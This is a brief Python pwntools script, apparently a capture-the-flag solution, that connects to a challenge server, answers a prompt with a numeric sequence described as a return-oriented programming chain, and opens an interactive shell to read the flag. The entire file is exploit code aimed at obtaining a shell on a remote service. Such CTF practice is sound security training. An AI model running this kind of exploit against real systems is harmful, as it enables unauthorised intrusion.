#!/usr/bin/env python3

from pwn import *

r = remote(host="bamboofox.cs.nctu.edu.tw", port=10001)


# Return-to-Oriented Porgramming (ROP) Exploit here
ret = r.recvuntil("Please assemble your assembly to get /home/ctf/flag:")
print(ret)

# Get the shell /bin/bash
# See NOTE for detail
data = b"1,10,9,7,7,12,4,2,2,8,8,8,8,8,0"
r.sendline(data)

r.interactive()
